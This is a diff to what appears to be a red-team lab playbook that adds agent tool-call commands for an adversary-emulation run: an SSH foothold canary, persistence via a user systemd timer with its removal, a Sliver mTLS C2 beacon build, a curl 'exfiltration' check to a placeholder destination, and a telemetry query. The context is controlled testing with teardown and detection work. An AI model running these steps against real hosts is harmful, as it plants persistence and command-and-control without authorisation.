@@ -68,9 +68,46 @@ callback without a matching host identity is a lab error, not a channel.
 
 One artifact at a time. Second artifact before teardown = stop.
 
+Foothold canary:
+
 ```
-cyber_process argv=["<presence-cmd>"]
-cyber_process argv=["<removal-cmd>"]
+cyber_process argv=["ssh","<user>@<host>","echo","CANARY-$(date +%s)",">>","<evidence-dir>/foothold.txt"]
+```
+
+Persistence — scheduled task (one mechanism):
+
+```
+cyber_process argv=["ssh","<user>@<host>","systemctl","--user","enable","canary-beacon.timer"]
+```
+
+Removal — before deploy:
+
+```
+cyber_process argv=["ssh","<user>@<host>","systemctl","--user","disable","--now","canary-beacon.timer"]
+```
+
+Presence check:
+
+```
+cyber_process argv=["ssh","<user>@<host>","systemctl","--user","is-enabled","canary-beacon.timer"]
+```
+
+C2 beacon — Sliver example:
+
+```
+cyber_process argv=["sliver-client","generate","--mtls","<c2-host>:8888","--os","linux","--arch","amd64","--save","<evidence-dir>/beacon"]
+```
+
+Exfiltration — canary file hash at destination:
+
+```
+cyber_process argv=["curl","-sS","-D","-","https://<approved-dest>/canary-UNIQUE.txt"]
+```
+
+Telemetry query (baseline and post-evasion):
+
+```
+cyber_process argv=["ssh","<user>@<host>","journalctl","--user","-u","canary-beacon","-n","20","--no-pager"]
 ```
 
 Detection twin → `harness-detection` using preserved synthetic artifacts.
